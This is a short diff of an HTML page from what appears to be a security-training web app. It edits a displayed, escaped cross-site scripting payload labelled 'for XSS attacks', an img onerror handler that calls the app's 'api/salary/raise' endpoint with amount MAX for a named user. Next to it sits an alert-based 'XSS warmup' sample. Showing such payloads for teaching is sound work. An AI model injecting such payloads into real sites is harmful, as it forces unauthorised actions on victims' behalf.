@@ -82,7 +82,7 @@
     </div>
     <div style="font-size: smaller" title="XSS warmup">&lt;img src='x' onerror='alert(2)'&gt;</div>
     <div style="font-size: smaller" title="for XSS attacks">
-        &lt;img src='x' onerror='fetch(`api/salary/raise?who=vrentea&amount=MAX`).then(function (x) {alert(-1)});>
+        &lt;img src='http://bogus.com/fake.jpeg' onerror='fetch(`api/salary/raise?who=vrentea&amount=MAX`).then(function (x) {alert(`Thank you!`)});'>
     </div>
     Start Date (dd-mm-yyyy):<input type="text" id="editStartDate"/> <br/>
     Teacher: <select id="editTeacher"></select><br/>
